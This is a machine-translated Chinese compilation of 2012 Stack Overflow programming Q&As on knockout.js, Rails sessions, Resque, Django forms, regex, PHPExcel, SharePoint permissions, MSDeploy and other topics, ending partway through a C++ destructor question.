`http://servername/ReportServer?/Folder1/Folder2/Folder3/ReportName&Param1=12345`

# javascript - 计算 html 输入字段并允许用户修改该字段

> ID：11235303
> 
> 赞同：1
> 
> 时间：2012-06-27T21:51:01.447
> 
> 标签：javascript, html, knockout.js

我是 knockout.js 的新用户，到目前为止，我对基本使用印象深刻。

我希望能够根据前一个字段（yr1 Expense）自动计算一个字段（yr2 Expense），但也允许用户更改自动计算的字段。然后，此自动计算字段将用于另一个计算（Total Yr2）。我一直在尝试用这个[jsfiddle](http://jsfiddle.net/jh4qN/12/)这样做，但到目前为止还没有运气。我在示例中找不到有关如何执行此操作的任何信息。

我首先尝试将 yr2 Expense 设为 observable，它不允许自动计算。然后，我尝试将 yr2 Expense 设为计算值，这不允许使用用户输入更新 Total Yr2。我想做的事是不可能的吗？我认为这在财务计算表格中很常见，这就是我这样做的目的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T23:34:38.980

首先，变量名应该易于理解和*表达意图*。钝化或缩写名称没有任何好处，就像你的小提琴中使用的那样。它们令人困惑，这增加了代码维护的难度。如果您打算稍后缩小您的 js，那么名称无论如何都无关紧要。如果您以后需要*阅读*您的代码，拥有完整、易于理解的名称会大有帮助。

有两种方法可以完成你所追求的。

一种方法是使用订阅者在更改后更改 observable 的计算。看到[这个，在页面底部附近](http://knockoutjs.com/documentation/observables.html)。这是演示此方法的[小提琴。](http://jsfiddle.net/jh4qN/14/)对于这个例子，我推荐这种方法。

**注意：**我将离开，`valueUpdate`以便仅在用户完成键入时才进行重新计算。如果你使用 afterkeydown，它会提前重新计算，导致问题。`[Enter]`当您希望它重新计算时，请尝试按下。

第二种方法是使用[可写的可观察](http://knockoutjs.com/documentation/computedObservables.html)对象（第二个标题，页面下方的 1/3）使其`computed observables`具有读取和写入方法。我认为这种方法不太适合这个特定的示例，但是链接的 KO 文档中的示例应该让您了解它何时可以正常工作。

# javascript - 从主干视图访问 Rails 会话变量

> ID：11235304
> 
> 赞同：1
> 
> 时间：2012-06-27T21:51:03.813
> 
> 标签：javascript, ruby-on-rails-3, jquery, backbone.js

这可能是一个非常简单的问题，但我找不到答案。我应该如何从 javascript/jQuery（从主干视图）访问 rails 会话变量？很可能这不是最佳实践，但这对我来说不是问题。

谢谢你，亚历山德拉

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-28T08:38:15.960

您可以使用[gon gem](https://github.com/gazay/gon)。它允许随每个请求自动发送数据，并可以从 javascript 访问它。

例如，在您的 Gemfile 中包含 gem 之后，您可以在 ApplicationController 中添加一个前置过滤器：

```
class ApplicationController < ActionController::Base

    before_filter :set_gon

    ...

    protected
    def set_gon
       gon.my_session_variable = session[:my_session_variable]
    end
end 
```

在您的应用程序布局中，您的 html 的部分标题：

```
<%= include_gon %> 
```

现在您可以从您的 javascript 中读取此值：

```
alert(gon.my_session_variable) 
```

这样，您只在 ajax 响应中包含特定于请求的数据，并且您的所有额外信息都可以从 gon 变量中获得。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-28T08:00:39.893

不，会话变量驻留在服务器上，因此没有直接的方法可以使用 javascript/jquery 访问会话变量。

您最好的选择是使用 javascript/jQuery 对服务器进行 ajax 调用，以使用您定义的 url，以返回您想要的会话变​​量，例如 JSON 格式，以便您可以直接在 Javascript 中访问它：

```
{
  "sessionVariableName": "sessionVariableValue"
} 
```

不，这绝对不是最佳实践。会话变量应保留在服务器 IMO 上。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-08T15:58:21.220

以防万一这可能对某人有帮助...

虽然 ejosafat 的回答是有效的，但我需要从 Backbone 访问 rails 会话变量的主要原因是能够修改它们。由于我不确定自己想要什么，所以我的问题一开始就模棱两可（例如，访问会话变量不必是直接过程）。我最终实现目标的方法是使用以下四个步骤：

1.  确保在 sessions_controller.rb 文件中初始化所需的 Rails 会话变量

2.  将您希望能够修改的会话变量的值发送到主干（在我的情况下，会话变量由使用的 rails 控制器访问，然后发送到相应的 rails 视图，然后发送到主干 app.js 文件，这使它们可以访问必要的主干视图）

3.  在 rails 端（在使用的控制器中）创建一个函数，该函数可以根据来自主干的 GET 请求更新 rails 会话变量。例如：

    ```
    def modify_session_variables
      if params[:taskParentId]
        session[:task_parent_id] = params[:taskParentId]
      end
    end 
    ```

4.  每次用户更改表示会话状态的主干变量时，向服务器发送一个 ajax 请求，其中包含 rails 会话变量的更新值。例如，我的一个主干模型将在其属性之一被修改时更新会话变量：

    ```
    saveAsParentTask: function() {
       var self = this;
       $.ajax({
         url: '/modify_session_variables',
         type: 'GET',
         data: {
           taskParentId: self.getId()
         },
         async: false,
         success: function() {
           App.filtersState.setSubtreeParent(self);
         }
       });
    }, 
    ```

只要他没有退出应用程序，这个过程就会保存用户的选择。有点复杂，但按我想要的方式工作。

# winapi - IX509PrivateKey::Create 在被称为“网络服务”时抛出访问被拒绝

> ID：11235308
> 
> 赞同：0
> 
> 时间：2012-06-27T21:51:32.803
> 
> 标签：winapi, cryptography, cryptoapi, x509

我正在使用 IX509PrivateKey 为 X.509 证书请求创建密钥（作为“NT AUTHORITY\NETWORK SERVICE”），并且 Create 方法正在生成拒绝访问（我正在从 C# 调用/调用调度接口，因此 HRESULT 被转换为 .NET 异常）。进程监视器还显示访问被拒绝尝试访问密钥文件（正在创建密钥文件）。

这是实际的代码：

```
 IX509PrivateKey privateKey = new CX509PrivateKey() as IX509PrivateKey;
        privateKey.Length = request.KeyLength;
        privateKey.ExportPolicy = X509PrivateKeyExportFlags.XCN_NCRYPT_ALLOW_EXPORT_FLAG;
        privateKey.KeySpec = X509KeySpec.XCN_AT_SIGNATURE;
        privateKey.KeyUsage = X509PrivateKeyUsageFlags.XCN_NCRYPT_ALLOW_ALL_USAGES;
        privateKey.MachineContext = true;
        privateKey.Create();
        return privateKey; 
```

如果我改为创建用户密钥集（通过将 MachineContext 设置为 false），我会看到“找不到文件”而不是“拒绝访问”。但是 ProcMon 什么也没显示；不尝试访问任何密钥文件。

在 Process Monitor 中，我能够确定“网络服务”无权访问密钥文件，因此我使用 IX509PrivateKey::SecurityDescriptor 属性来设置它。“网络服务”确实可以访问密钥文件，但我仍然收到来自 Create 的访问被拒绝，并且 ProcMon 仍然显示对该文件的访问被拒绝尝试。

很多 TIA 适合任何和所有想法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-05T16:20:45.980

已确定此问题的原因。

对 IX509PrivateKey::Create 的调用发生在 Web 服务中。结果，它是在假冒IUSR的情况下发生的。我们编辑了启用错误用户的 ACL。结果是直接拒绝访问，仅针对混淆的用户帐户。这种情况可以在 ProcMon 中观察到。ProcMon 的“详细信息”列将清楚地指示（您可能必须启用“高级输出”）调用是在模拟用户帐户下进行的。

为了更严格地控​​制进行调用和访问 CA 的用户帐户，我们将请求移出进程。注册 API 调用现在由它们自己的 Windows 服务进行，并通过 WCF (net.tcp) 公开给在 IIS 中运行的 Web 服务。这将是我对其他人的建议。IMO，在 IIS 内进行调用缺乏控制的风险超过了另一个“移动部分”的风险。

# ruby-on-rails - 以编程方式获取 Resque 队列中的作业数

> ID：11235318
> 
> 赞同：61
> 
> 时间：2012-06-27T21:52:20.697
> 
> 标签：ruby-on-rails, ruby, redis, resque

我有兴趣设置一个监控服务，只要 Resque 队列中有太多作业（我有大约 6 个队列，每个队列都有不同的编号），它就会寻呼我。我还想设置一个非常相似的监控服务，当我在队列中超过一定数量的失败作业时会提醒我。

我的问题是，我在我的 redis 服务器上看到了与 Resque 相关的许多密钥和混乱。我不一定看到一种直接的方法来获取每个队列的作业数或​​失败的作业数。目前有没有一种简单的方法可以从 redis 中获取这些数据？

* * *

## 回答 #1

> 赞同：146
> 
> 时间：2012-06-27T22:56:20.100

是的，这很容易，因为您使用的是[Resque gem](https://github.com/resque/resque)：

```
require 'resque'

Resque.info 
```

将返回一个哈希

例如/ =>

```
{
      :pending => 54338,
      :processed => 12772,
      :queues => 2,
      :workers => 0,
      :working => 0,
      :failed => 8761,
      :servers => [
      [0] "redis://192.168.1.10:6379/0"
    ],
    :environment => "development"
} 
```

因此，要获取失败的作业计数，只需使用：

```
Resque.info[:failed] 
```

这将给出 => 8761 #在我的例子中

要获取队列，请使用：

```
Resque.queues 
```

这返回一个数组

例如/ =>

```
[
    [0] "superQ",
    [1] "anotherQ"
] 
```

然后，您可以找到每个队列的作业数：

```
Resque.size(queue_name) 
```

例如/`Resque.size("superQ")` 或 `Resque.size(Resque.queues[0])` ......

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2014-06-05T03:52:13.980

这是一个 bash 脚本，它将监视排队的作业总数和失败的作业数。

```
while :
do 
  let sum=0
  let errors=$(redis-cli llen resque:failed)
  for s in $(redis-cli keys resque:queue:*)
  do 
    let sum=$sum+$(redis-cli llen $s)
  done
  echo $sum jobs queued, with $errors errors
  sleep 1 # sleep 1 second, probably want to increase this
done 
```

这适用于 Resque 1.X，2.0 可能有不同的键名。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2020-06-30T15:29:41.833

还有一种方法`Resque.queue_sizes`返回队列名称和大小的哈希

> Resque.queue_sizes => {"default"=>0, "slow"=>0}

# iphone - 如何创建乐器

> ID：11235321
> 
> 赞同：-2
> 
> 时间：2012-06-27T21:52:32.127
> 
> 标签：iphone, ios, ipad, audio

我正在研究[LoadPresetDemo](https://developer.apple.com/library/ios/#samplecode/LoadPresetDemo/Listings/LoadPresetDemo_Classes_MainViewController_m.html)。Trombone 由 3 个 CAF 文件组成。
我怎样才能创建自己的乐器，就像长号一样？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T22:00:47.613

在发布您的问题之前，您是否阅读了该[LoadPresetDemo 示例](https://developer.apple.com/library/ios/#samplecode/LoadPresetDemo/Listings/ReadMe_txt.html)的文档？

从读我：

> 了解此示例代码项目中使用的预设文件是如何
> 
> 在 Mac OS X 中使用 AU Lab 创建，在 iOS 和 Lion 中查看音乐
> 
> 来自 WWDC 2011 的演示文稿，特别是关于采样器的部分
> 
> 音频单元。[https://developer.apple.com/videos/wwdc/2011/?id=411](https://developer.apple.com/videos/wwdc/2011/?id=411)

# python - Django - 通过带有预填充值的搜索表单优化搜索结果

> ID：11235325
> 
> 赞同：0
> 
> 时间：2012-06-27T21:53:17.953
> 
> 标签：python, django, django-forms, django-views

在我的主页上，我有一个简单的搜索表单。用户可以输入一些过滤器，然后在下一步中，搜索结果将显示在新页面上 => 这一切正常：

下面是 view.py 的简化版本：

```
def search(request):
    form = SearchForm()
    if request.method == 'POST':
        form = SearchForm(request.POST)
        results = search(form)
        return render_to_response('search_results.html',{'results': results},context_instance = RequestContext(request))
    else:
        form = SearchForm()
    return render_to_response('search.html',{'form': form},context_instance = RequestContext(request)) 
```

现在的问题是：下一步我想在`search_result.html`页面中添加相同的搜索表单。目的是用户可以使用该搜索表单细化搜索结果。在理想情况下，搜索表单上`search_results.html`已经`search.html`预先填写了输入的过滤器。

我在如何解决这个问题上有点挣扎。我应该将原始输入的过滤器作为列表传递给`search_result.html`页面吗？我怎样才能做到这一点？以及如何将这些值作为默认值放在表单中？也许我以某种方式过度考虑了这一点，但目前我没有看到一个好的解决方案。

任何反馈，方向非常感谢！

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T01:29:35.713

你不能让你的上下文 dict`{'results': results, 'form': form}`吗？这将使表单再次可用，之前发布的数据已经绑定到表单。

# bash - 在 Mac OS X 上测试 bash 脚本中的 URL

> ID：11235329
> 
> 赞同：0
> 
> 时间：2012-06-27T21:53:43.653
> 
> 标签：bash

我对脚本很陌生，但我还是想做以下事情：

我有一个包含一堆 URL 的文本文件，每行一个。我想要一个 bash 脚本，它使用 Web 浏览器打开每个 URL，等待 5 秒，从页面获取响应，然后关闭浏览器并记录来自文本文档中 URL 之后分隔的页面插入符号的响应，并重复该过程每一行。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-27T22:10:05.620

如果您只需要 URL 响应，则无需打开 GUI Web 浏览器。如果是这样，那么使用`curl`：

```
for url in `cat urlList.txt`; do
    curl $url >> urlsOut.txt;
    echo "" >> urlsOut.txt;
    echo "^" >> urlsOut.txt;
done 
```

如果您想要解析的内容，例如浏览器窗口中的输出，您需要利用[Selenium](http://seleniumhq.org/)之类的东西，这不仅仅是一个 bash 解决方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-27T21:57:24.867

我不知道如何用 bash 做这个，但你可以尝试用[Selenium来获得这些响应](http://seleniumhq.org/)

# java - 正则表达式捕获行之间的连字符和非连字符

> ID：11235331
> 
> 赞同：0
> 
> 时间：2012-06-27T21:53:55.607
> 
> 标签：java, regex, match, capture

我正在尝试用java编写一个匹配单词和连字符的正则表达式。到目前为止，我有：

```
Pattern p1 = Pattern.compile("\\w+(?:-\\w+)",Pattern.CASE_INSENSITIVE);
Pattern p2 = Pattern.compile("[a-zA-Z0-9]+",Pattern.CASE_INSENSITIVE);
Pattern p3 = Pattern.compile("(?<=\\s)[\\w]+-$",Pattern.CASE_INSENSITIVE | Pattern.DOTALL); 
```

这是我的测试用例：

```
    程式
    Dsfasdf。程序 程序 Dsfasdf。Dsfasdf。哇哇哇！哇。哇？好的。
    他说：“嗨。” aasdfa. wsdfalsdjf. 去去去-
到
asdfasdf .. , : ; " ' ( ) ? ! - / \ @ # $ % & ^ ~ ` * [ ] { } + _ 123
```

任何帮助都是极好的

我的预期结果是匹配所有单词，即。

```
程序 Dsfasdf 程序 程序 Dsfasdf Dsfasdf
就像哇哇哇哇好的他说嗨aasdfa
wsdfalsdjf go-to go-to asdfasdf
```

我正在努力的部分是将在行之间拆分的单词匹配为一个单词。

IE。

```
去-
到

```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-27T22:04:23.733

```
\p{L}+(?:-\n?\p{L}+)*
\ /^\ /^\ /\ /^^^
 \ / | | | | \ / |||
  | | | | | | ||`- 前一个可以重复 0 次或多次（一组文字“-”、可选换行符和一个或多个任意字母（大写/小写））
  | | | | | | |`-- 结束第一个非捕获组
  | | | | | | `--- 匹配一个或多个前面的（任何字母，大写/小写）
  | | | | | `----- 匹配任何字母（大写/小写）
  | | | | `--------- 匹配单个换行符（可选，因为 `?`）
  | | | `------------ 字面量 '-'
  | | `------------- 启动第一个非捕获组
  | `---------------- 匹配一个或多个前面的（AZ之间的任何字母（大写/小写））
  `-------------------- 匹配任意字母（大写/小写）

```

[这个可以吗？](http://rubular.com/r/Ryktjf42w7)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-27T22:36:31.723

我会用正则表达式：

```
\p{L}+(?:\-\p{L}+)* 
```

这样的正则表达式还应该匹配单词*“fiancé”*、*“À-la-carte”*和其他包含一些特殊类别“字母”字符的单词。`\p{L}`匹配“字母”类别中的单个代码点。

# ruby-on-rails - 是否有一种“有福的”Heroku 方式来设置 SSLProxy？

> ID：11235332
> 
> 赞同：1
> 
> 时间：2012-06-27T21:54:00.527
> 
> 标签：ruby-on-rails, ruby, ssl, heroku, reverse-proxy

我正在构建一个社交网站，其中所有内容都通过 SSL 提供。我希望能够粘贴：

```
http://i.imgur.com/W15FE.jpg 
```

并让应用程序提供类似的服务

```
https://myproxy.com/i.imgur.com/W15FE.jpg 
```

从而避免有关不安全内容的警告。

我对更好的方法持开放态度，但我希望通过信用等将用户链接回原始图像/站点，并且以我目前的理解，不希望避免自己下载和托管图像。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-27T22:50:05.047

### 同一主机

您可以在 ApplicationController 中强制重定向到 SSL。首先，您需要为您的 Heroku 应用程序配置 SSL；[搭载 SSL](https://devcenter.heroku.com/articles/ssl#piggyback_ssl_myappherokucom_and_myappherokuappcom_only)可能足以满足您的用例。

接下来，将您的应用配置为在生产环境中重定向到 SSL。例如：

```
# app/controllers/application_controller.rb
class ApplicationController < ActionController::Base
  before_filter :redirect_to_https
  private
  def redirect_to_https
    redirect_to :protocol => "https://" unless ( request.ssl?  ||
                                                 request.local? )
  end
end 
```

### 远程主机

如果您不直接托管文件，则可能需要使用路由或控制器操作重定向浏览器。例如，在修改的[request.url上](http://guides.rubyonrails.org/action_controller_overview.html#the-request-object)[使用 redirect_to](http://api.rubyonrails.org/classes/ActionController/Redirecting.html#method-i-redirect_to)。

# automapper - 我可以设置约定 AutoMapper 属性吗

> ID：11235333
> 
> 赞同：0
> 
> 时间：2012-06-27T21:54:28.670
> 
> 标签：automapper

我在我正在处理的一个新项目中广泛使用 Markdown，我希望能够配置一个 AutoMapper 约定，将 Property X 的所有实例映射到 XMarkdown，并将结果输出转换为 Markdown。

所以，如果我给任何目标字符串属性提供后缀 Markdown 并且源是一个字符串，那么我想转换输出。

ps 我知道如何渲染 Markdown，所以我真正想要的是让 AutoMapper 为我消除乏味的约定。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-02T20:47:41.640

如果事情真的是一致的，比如 FirstNameMarkdown，你可以使用一些内置函数。

```
Mapper.Initialize(cfg => cfg.RecognizeDestinationPostfixes(new[] { "Markdown" })); 
```

# php - phpExcell 生成额外的工作表

> ID：11235336
> 
> 赞同：1
> 
> 时间：2012-06-27T21:54:42.057
> 
> 标签：php, zend-framework, phpexcel

我正在尝试在我的 Zend 应用程序中使用 phpExell 来打印带有多个工作表的 Excel 文件。

在我的控制器类中，我有以下全局变量...

```
public $objPHPExcel; 
```

它在像这样的动作函数中初始化......

```
$this->objPHPExcel = new PHPExcel(); 
```

然后，该操作遍历一些数据库调用，构建报告。在每次迭代中，它调用以下函数，将工作表的索引作为整数、要打印的数据数组以及包含工作表名称的字符串传入。

```
protected function buildWorksheet($index, $report, $repName) {
   //build new worksheet after default
   if($index > 0) {
       $objWorksheet = $this->objPHPExcel->createSheet();
       $this->objPHPExcel->addSheet($objWorksheet);
   }  else {
        $this->objPHPExcel->setActiveSheetIndex($index);
        $objWorksheet = $this->objPHPExcel->getActiveSheet();
   }  
    //write the worksheet
    $col = 0;
    $row = 1;
    foreach($report as $entry) {
        foreach($entry as $key => $value) {
             $objWorksheet->setCellValueByColumnAndRow($col, $row, $value);
            $col++;
        }
        $row++;
        $col = 0;

    }

    $objWorksheet->setTitle($repName);  
} 
```

然后，回到我打印出excel文件的动作......

```
 $objWriter = PHPExcel_IOFactory::createWriter($this->objPHPExcel, 'Excel5');
    ob_start();
    if ( headers_sent() ) die("**Error: headers sent");
    header("Pragma: public");
    header("Expires: 0");
    header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
    header("Content-Type: application/force-download");
    header("Content-Type: application/octet-stream");
    header("Content-Type: application/download");
    header('Content-Disposition: attachment;filename="simple.xls"');
    header("Content-Transfer-Encoding: binary");
    ob_clean();
    $objWriter->save('php://output');
    exit(); 
```

当我在 Excel 中打开文件时，我收到以下消息...

```
 Excel found unreadable content in 'simple.xls'. Do you want to recover the contents of this workbook? 
```

我点击是。然后得到两个“重命名无效工作表名称”。修复错误消息。该文件包含每个迭代的工作表，但对于默认工作表之后的每个人，它都会添加一个额外的工作表。为什么要创建额外的电子表格？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-27T22:11:50.993

原来你不需要调用 addSheet。createSheet() 会自动为您执行此操作。我删除了

```
 $this->objPHPExcel->addSheet($objWorksheet); 
```

现在工作正常。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-27T22:42:54.797

```
/**
 * Create sheet __and add it to this workbook__
 *
 * @param int|null $iSheetIndex Index where sheet should go (0,1,..., or null for last)
 * @return PHPExcel_Worksheet
 * @throws Exception
 */
public function createSheet($iSheetIndex = null) 
```

# ruby-on-rails - 干萝卜步骤定义

> ID：11235340
> 
> 赞同：2
> 
> 时间：2012-06-27T21:55:14.473
> 
> 标签：ruby-on-rails, testing, rspec, cucumber, dry

我知道这可以通过捕获可选组来使用 cucumber（请参阅此处的[提示 3](http://coryschires.com/ten-tips-for-writing-better-cucumber-steps/)），并且我在萝卜中使用它，但我不喜欢这个解决方案。

我试图消除只是彼此正面/负面的多个步骤。

因此，而不是像这样的 2 个步骤：

```
step "I should see :content in the footer" do |content|
  within(".footer-main") do
    page.should(have_selector("h3", text: content)) 
  end
end

step "I should not see :content in the footer" do |content|
  within(".footer-main") do
    page.should_not(have_selector("h3", text: content)) 
  end
end 
```

我可以做这个：

```
step "I should :not_text see :content in the footer" do |not_text, content|
  within(".footer-main") do
    not_text.blank? ? page.should(have_selector("h3", text: content)) : page.should_not(have_selector("h3", text: content)) 
  end
end 
```

这很好用，但我真正不喜欢的是我必须在积极的情况下放空括号，如下所示：

```
Scenario: User should see Company in the footer
    When I visit the "root page"
    Then I should "" see "Company" in the footer 
```

有一个更好的方法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-27T17:59:28.923

如何使用以下步骤定义：

```
step "I :should_or_not_text see :content in the footer" do |should_or_not_text, content|
  within(".footer-main") do
    should_or_not_text == "should" ? page.should(have_selector("h3", text: content)) : page.should_not(have_selector("h3", text: content)) 
  end
end 
```

然后该功能看起来有点干净：

```
Scenario: User should see Company in the footer
    When I visit the "root page"
    Then I "should" see "Company" in the footer 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-07T12:04:19.263

AFAIK - 这应该工作：

```
step "I should (not )? see :content in the footer" do |not_text, content|
  within(".footer-main") do
    not_text.blank? ? page.should(have_selector("h3", text: content)) : page.should_not(have_selector("h3", text: content)) 
  end
end 
```

接着：

```
Scenario: User should see Company in the footer
    When I visit the "root page"
    Then I should see "Company" in the footer

Scenario: User should not see City in the footer
    When I visit the "root page"
    Then I should not see "City" in the footer 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-12-05T11:20:43.993

```
step 'I should:not see :text' do |negative, text|
  expect(page).to(negative ? have_no_text(text) : have_text(text))
end

placeholder(:not) do
  match(/ not/) do
    true
  end
end 
```

# r - 使用方差分析在 R 语言中复制拉丁方分析

> ID：11235341
> 
> 赞同：1
> 
> 时间：2012-06-27T21:55:20.543
> 
> 标签：r, latin-square

我正在执行一个包含 2 个处理和 2 个块变量（参与者和过程）的 1 个因素（工具）实验。换句话说，一个 2x2 的拉丁方格。

块变量之一是参与者。由于我的样本有 8 个参与者，因此我有 4 个 2x2 拉丁方格。

为了对 1 个拉丁方格进行分析，我通过 R 中的以下命令使用 ANOVA：

```
result = aov(time~participant+process+tool);
print(summary(result)); 
```

我的问题是：**如何在 R 中使用复制的拉丁方格执行 ANOVA 测试？**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T06:10:28.187

```
library(nlme) # Avoid lme4 for starter, documentation is not that good yet
result = lme(time~process*tool, data=...., random = ~1|participant)
summary(result) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T15:42:19.140

我找到了一个很好的参考来了解如何分析复制的拉丁方格：

[http://halweb.uc3m.es/esp/Personal/personas/jmmarin/esp/Disenno/CursoDisExpSAS.pdf](http://halweb.uc3m.es/esp/Personal/personas/jmmarin/esp/Disenno/CursoDisExpSAS.pdf)

在第 42 页可以观察到我的情况是：**“新行和相同的列”**

因此，ANOVA 表应根据第 46 页中的表。特别注意来源和自由度 (df)。

为了在 R 中编码表达的概念，我做了以下工作：

结果=aov（时间~工具+**参与者：副本**+进程+**副本**）；

粗体部分是为了表示第 46 页中的表格而进行的更改。

# silverlight - Silverlight 如何向复选框列表添加“全选”选项？

> ID：11235343
> 
> 赞同：1
> 
> 时间：2012-06-27T21:55:22.140
> 
> 标签：silverlight

我在 Silverlight 中有一个复选框列表。它实际上是一个带有复选框的 Telerik rad 组合框。

我要做的是在该列表中添加一个带有“全选”标签的初始项目。当用户单击该项目时，它将选择或取消选择列表中的项目。此外，当用户取消选择某个项目时，它应该取消选择“全选”。

问题是我有一个 CheckedItemsChanged 事件，当列表中的项目发生更改时会触发该事件。如果我尝试在该事件期间更改列表，它会抱怨我无法在集合更改事件中更改集合。

还有其他方法可以做到这一点吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T21:49:55.193

I'm guessing you're attempting to do something like

```
void SomeComboBox_CheckedItemsChanged(object sender, SomeEventArgs e)
{
    // Do stuff with checked items in list
} 
```

Does it help if you use `Dispatcher.BeginInvoke` to do the stuff involving the checked items, i.e. something like the following?

```
void SomeComboBox_CheckedItemsChanged(object sender, SomeEventArgs e)
{
    Dispatcher.BeginInvoke(() =>
    {
        // Do stuff with checked items in list
    });
} 
```

# c# - sharepoint 事件接 收器安全异常

> ID：11235345
> 
> 赞同：2
> 
> 时间：2012-06-27T21:55:32.593
> 
> 标签：c#, security, sharepoint, iis, gac

我有一个 SharePoint 2010 事件接收器，用于侦听 SharePoint 列表上的添加/更新/删除事件。当事件发生时，用 C# 编写的事件接收器需要将这些事件传递给 Java 程序。我的代码发布在下面。我可以很好地部署接收器并且它可以工作。我得到了我需要的所有 SharePoint 事件。现在我的问题是将这些事件传递给 Java。每次我尝试打开套接字或将 SharePoint 事件写入文件时都会出现安全异常。例如，查看我在下面发布的 ItemDeleting 方法，该方法在每次从 SharePoint 列表中删除项目时触发。当我尝试打开 Java 套接字时，我得到 System.Net.DnsPermission 异常。如果我不打开套接字并尝试写入文件，则会收到 System.Security.Permissions.FileIOPermission 异常。

我环顾了论坛，并尝试了一些方法来解决它。首先，我在 SharePoint 的 web.xml 中设置了 trust level="Full"。然后我设置了我的程序集的 DeploymentTarget="GlobalAssemblyCache"。这没有帮助。我还可以做些什么？预先感谢您的回复。

我的事件接收器代码：

```
using System;
using System.Security.Permissions;
using Microsoft.SharePoint;
using Microsoft.SharePoint.Security;
using Microsoft.SharePoint.Utilities;
using Microsoft.SharePoint.Workflow;
using System.Net.Sockets;
using System.IO;

namespace EventReceiverTest
{

    public class EventReceiver1 : SPItemEventReceiver
    {

       public override void ItemAdding(SPItemEventProperties properties)
       {
           base.ItemAdding(properties);
       }

       public override void ItemUpdating(SPItemEventProperties properties)
       {
           base.ItemUpdating(properties);
       }

       public override void ItemDeleting(SPItemEventProperties properties)
       {
           //can't open a socket connection.Request for the permission of type 'System.Net.DnsPermission,... failed
           TcpClient tc = new TcpClient("192.168.xxx.xxx", xxx);
           Console.WriteLine("Server invoked");
           NetworkStream ns = tc.GetStream();
           StreamWriter sw = new StreamWriter(ns);
           sw.WriteLine("item deleted");
           sw.Flush();
           StreamReader sr = new StreamReader(ns);
           Console.WriteLine(sr.ReadLine());

           //can't write to file.  Request for the permission of type 'System.Security.Permissions.FileIOPermission,...failed
           System.IO.StreamWriter file = new System.IO.StreamWriter("c:\\logs\\test.txt");
           file.WriteLine("item deleted " + properties.ListItem);

           //can't output anything to a console
           Console.Out.WriteLine("deleting an item ");

           base.ItemDeleting(properties);

           //but this part works
           properties.Status = SPEventReceiverStatus.CancelWithError;
           properties.ErrorMessage = "Deleting items from " + properties.RelativeWebUrl + " is not supported.";
       }
    }
} 
```

* * *

```
<?xml version="1.0" encoding="utf-8" ?>
<Feature xmlns="http://schemas.microsoft.com/sharepoint/">
  <Properties>
    <Property Key="GloballyAvailable" Value="true" />
  </Properties>
</Feature> 
```

* * *

```
<?xml version="1.0" encoding="utf-8"?>
<Solution xmlns="http://schemas.microsoft.com/sharepoint/">
  <Assemblies>
    <Assembly Location="EventReceiver3.dll" DeploymentTarget="GlobalAssemblyCache" />
  </Assemblies>
  <FeatureManifests>
    <FeatureManifest Location="EventReceiver3_Feature1\Feature.xml" />
  </FeatureManifests>
</Solution> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-27T22:05:00.797

您需要 FullTrust 并运行访问“SharePoint:System”帐户下的系统资源（如文件）的代码。

起点 - [SPSecurity.RunWithElevatedPrivileges](http://msdn.microsoft.com/en-us/library/microsoft.sharepoint.spsecurity.runwithelevatedprivileges.aspx)。

请参阅[如何在 SharePoint 2010 托管代码中存储临时文件？](https://stackoverflow.com/questions/11116218/how-to-store-temp-files-in-sharepoint-2010-hosted-code/11116685#11116685).

# iis-7 - 使用 WMSVC 和 NTLM Auth 部署到 IIS7 时，如何在没有用户名和密码的情况下编写 MSBuild 参数？

> ID：11235353
> 
> 赞同：3
> 
> 时间：2012-06-27T21:56:27.273
> 
> 标签：iis-7, msbuild, tfsbuild, webdeploy

我一直在尝试使用带有 WMSVC 的 TFS/MSBuild 自动部署我们的 Web 应用程序。**问题是我不能使用公开密码的构建脚本**。我希望我可以获取构建服务器用来在我的 IIS 7.5 机器上通过 WMSVC 进行身份验证的身份，并使用已承诺的所有 web.config 优点部署应用程序。

[这里](https://stackoverflow.com/questions/7639597/how-do-i-deploy-using-msdeploy-in-team-build-2010-using-the-wmsvc-service-and-nt)还有一个帖子提供了解决方法，并指出 WMSVC 默认为 BASIC auth 并加密密码。这不是我们想做的事情。我们的要求是在不将用户/密码嵌入构建脚本的情况下进行部署。

我们希望能够通过委托或将构建服务器添加到 IIS 机器上的管理员组来使用 NTLM。

这完全不可能吗？如果没有在构建脚本中指定用户名和密码，就没有办法做到这一点？我只希望我已经在 IIS 端分配的凭据让我的构建服务器工作。知道这只是一厢情愿吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-25T06:13:56.773

[我相信您正在此处描述](http://technet.microsoft.com/en-us/library/dd569001%28v=WS.10%29.aspx)的 msdeploy 命令行中寻找*-authType NTLM标志*

```
msdeploy -verb:sync -source:webServer,wmsvc=Server1,authtype=NTLM 
```

# c++ - 调用 ~Derived() 和 ~Base() 之间的对象状态

> ID：11235357
> 
> 赞同：6
> 
> 时间：2012-06-27T21:56:44.603
> 
> 标签：c++, destructor, object-lifetime

## 问题

C++ 标准在派生类的析构函数执行之后、基类的析构函数执行之前的时间内保证对象的状态是什么？（这是调用派生类的子对象的析构函数的时候。）

## 例子

```
